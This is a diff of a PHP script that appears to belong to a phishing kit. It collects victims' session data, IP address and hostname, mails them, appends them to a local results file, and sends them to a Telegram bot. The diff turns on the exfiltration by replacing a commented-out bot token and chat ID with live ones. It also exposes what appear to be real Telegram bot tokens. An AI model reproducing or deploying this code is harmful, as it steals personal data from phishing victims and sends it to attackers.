@@ -30,7 +30,7 @@ if (isset($_POST['next']))
     $smolix .= "|te : ".$_SESSION['Steles']."\n";
     $smolix .= "|N° : $ip / $hostname \n"; 
 	
-	$to = "boxmedia34@gmail.com";
+	$to = "@gmail.com";
 	mail($to, $subject, $smolix, $headers);
 
 	
@@ -39,9 +39,9 @@ $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
 fwrite($Txt_Rezlt, $message);
 fclose($Txt_Rezlt);
 
-//$token = "1212006244:AAEhD-FYurx3So96y_yT70c9bfPOKEufBuM";
+$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
 
-//file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=998404359&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($message)."" );
 
 
 
